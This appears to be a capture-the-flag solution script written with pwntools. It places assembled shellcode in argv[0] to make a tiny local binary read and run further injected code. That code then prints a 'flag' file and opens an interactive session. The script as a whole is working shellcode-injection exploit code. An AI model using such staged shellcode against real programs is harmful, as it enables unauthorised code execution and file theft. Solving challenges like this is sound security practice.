#!/usr/bin/env python3
#Solution by iretq <me@iretq.dev> https://github.com/48cf

from pwn import *

context.arch = "amd64"
argv0 = asm("""
    xor eax, eax
    mov dl, 0x7f
    syscall
    push 1
    ret
""")

io = process([argv0], executable="./tiny")

io.send(b"\x90\xc3\x90")
io.send(b"\x90" + asm(shellcraft.amd64.linux.cat("flag")))
io.interactive()
